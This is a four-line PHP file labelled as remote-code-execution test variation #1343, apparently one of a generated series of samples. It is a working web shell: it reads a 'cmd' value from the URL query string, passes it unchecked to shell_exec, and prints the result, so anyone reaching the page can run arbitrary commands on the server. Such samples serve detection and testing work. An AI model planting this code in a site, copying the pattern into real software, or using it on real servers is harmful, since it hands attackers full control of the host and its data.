<?php
// RCE test variation #1343
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>